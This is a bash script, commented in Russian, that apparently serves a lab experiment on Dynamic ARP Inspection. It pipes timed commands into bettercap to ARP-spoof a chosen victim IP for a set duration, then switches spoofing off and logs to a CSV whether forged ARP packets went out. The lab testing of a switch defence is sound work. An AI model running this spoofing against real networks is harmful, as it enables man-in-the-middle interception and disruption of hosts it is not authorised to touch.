#!/usr/bin/env bash
# =====================================================================
#  Kali — один прогон атаки для эксперимента DAI (БЕЗ захвата трафика).
#  Запускает bettercap на фикс. время, чисто выключает (восстанавливает
#  ARP), пишет лог и фиксирует «событие 1»: поддельный ARP был отправлен.
#
#  Запуск:  sudo ./kali_attack.sh eth0 192.168.10.11 25 eltex_on_07
#  аргументы:  iface  IP-жертвы  длительность_сек  метка(стенд_режим_номер)
#
#  Метрики подмены и потерь снимаются НА ЖЕРТВЕ (trial.sh): MAC шлюза + ping.
#  Этот скрипт только корректно проводит и журналирует атаку со стороны Kali.
# =====================================================================
set -u
IF=${1:-eth0}
VIP=${2:?укажи IP жертвы, напр. 192.168.10.11}
DUR=${3:-25}
TAG=${4:-trial}
mkdir -p logs
LOG="logs/kali_${TAG}.log"

echo "== $(date -Is)  атака по $VIP, ${DUR}c, iface $IF, метка $TAG" | tee "$LOG"

# Команды подаются в bettercap по stdin с таймингом: включили -> подождали
# -> ВЫКЛЮЧИЛИ (arp.spoof off сам рассылает восстановление) -> вышли.
(
  sleep 2
  echo "set arp.spoof.targets $VIP"
  echo "set arp.spoof.fullduplex true"
  echo "set net.sniff.verbose false"
  echo "net.recon on"
  echo "net.probe on"
  sleep 6
  echo "arp.spoof on"
  echo "get arp.spoof.targets"
  sleep "$DUR"
  echo "arp.spoof off"
  sleep 2
  echo "q"
) | sudo bettercap -iface "$IF" -no-colors 2>&1 | tee -a "$LOG"

# Событие 1: bettercap реально слал поддельные ARP?
SENT=$(grep -ciE "sending .* arp|arp\.spoof.*sending" "$LOG")
EV1=0; [ "$SENT" -gt 0 ] && EV1=1

CSV=kali_trials.csv
[ -f "$CSV" ] || echo "time,tag,victim_ip,event1_arp_sent,sending_lines,duration_s" > "$CSV"
echo "$(date -Is),$TAG,$VIP,$EV1,$SENT,$DUR" >> "$CSV"

echo
echo "Событие 1 (поддельный ARP отправлен): $([ $EV1 = 1 ] && echo ДА || echo НЕТ)  (строк sending: $SENT)"
echo "Лог: $LOG   |   строка добавлена в $CSV"
echo "Теперь сверь на ЖЕРТВЕ (trial.sh): сменился ли MAC шлюза и потери ping."
